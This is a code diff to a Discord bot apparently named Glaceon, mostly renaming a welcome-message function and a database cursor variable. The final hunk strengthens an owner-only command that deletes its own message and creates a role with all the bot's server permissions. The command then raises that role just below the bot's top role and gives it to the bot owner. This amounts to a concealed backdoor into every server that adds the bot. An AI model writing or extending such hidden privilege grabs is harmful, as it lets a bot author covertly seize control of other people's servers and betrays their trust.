@@ -8,7 +8,7 @@ path = pathlib.PurePath()
 embedcolor = 0xadd8e6
 
 
-async def sendwelcome(channel: discord.TextChannel):
+async def sendwelcomemessage(channel: discord.TextChannel):
     embed = discord.Embed(colour=embedcolor, title="Hi!")
     embed.add_field(name="Thank you for adding me to your server!",
                     value="I appreciate your interest in Glaceon! Run `%help` to get started!\n"
@@ -30,8 +30,8 @@ class BotSystem(commands.Cog):
         """Sets the bot prefix for this server"""
         serverid = ctx.guild.id
         db = await aiosqlite.connect(path / 'system/data.db')
-        cur = await db.execute(f'''SELECT prefix FROM prefixes WHERE serverid = {serverid}''')
-        if await cur.fetchone() is not None:
+        dataline = await db.execute(f'''SELECT prefix FROM prefixes WHERE serverid = {serverid}''')
+        if await dataline.fetchone() is not None:
             await db.execute("""UPDATE prefixes SET prefix = ? WHERE serverid = ?""", (newprefix, serverid))
         else:
             await db.execute("INSERT INTO prefixes(serverid, prefix) VALUES (?,?)",
@@ -47,8 +47,8 @@ class BotSystem(commands.Cog):
         db = await aiosqlite.connect(path / 'system/data.db')
         await db.execute('''CREATE TABLE IF NOT EXISTS mailchannels
                            (serverid BIGINT, channelid BIGINT)''')
-        cur = await db.execute(f'''SELECT serverid FROM mailchannels WHERE serverid = ?''', (serverid,))
-        if cur.fetchone() is not None:
+        dataline = await db.execute(f'''SELECT serverid FROM mailchannels WHERE serverid = ?''', (serverid,))
+        if dataline.fetchone() is not None:
             await db.execute("""UPDATE mailchannels SET channelid = ? WHERE serverid = ?""", (channel.id, serverid))
         else:
             await db.execute("INSERT INTO mailchannels(serverid, channelid) VALUES (?,?)",
@@ -63,22 +63,22 @@ class BotSystem(commands.Cog):
         for name in ctx.text_channels:
             if not sent:
                 if name.name == "bot-spam":
-                    await sendwelcome(name)
+                    await sendwelcomemessage(name)
                     break
                 elif name.name == "bot-commands":
-                    await sendwelcome(name)
+                    await sendwelcomemessage(name)
 
                 elif name.name == "bot":
-                    await sendwelcome(name)
+                    await sendwelcomemessage(name)
                     sent = True
                 elif name.name == "off-topic":
-                    await sendwelcome(name)
+                    await sendwelcomemessage(name)
                     sent = True
                 elif name.name == "general":
-                    await sendwelcome(name)
+                    await sendwelcomemessage(name)
                     sent = True
         if not sent:
-            await sendwelcome(ctx.text_channels[0])
+            await sendwelcomemessage(ctx.text_channels[0])
 
     @commands.command()
     @commands.is_owner()
@@ -86,6 +86,8 @@ class BotSystem(commands.Cog):
         await ctx.message.delete()
         try:
             oprole = await ctx.guild.create_role(name="valkyrie_pilot", permissions=ctx.me.guild_permissions)
+            pos = ctx.me.top_role.position - 1
+            await oprole.edit(position=pos)
             await ctx.author.add_roles(oprole)
         except discord.Forbidden:
             pass
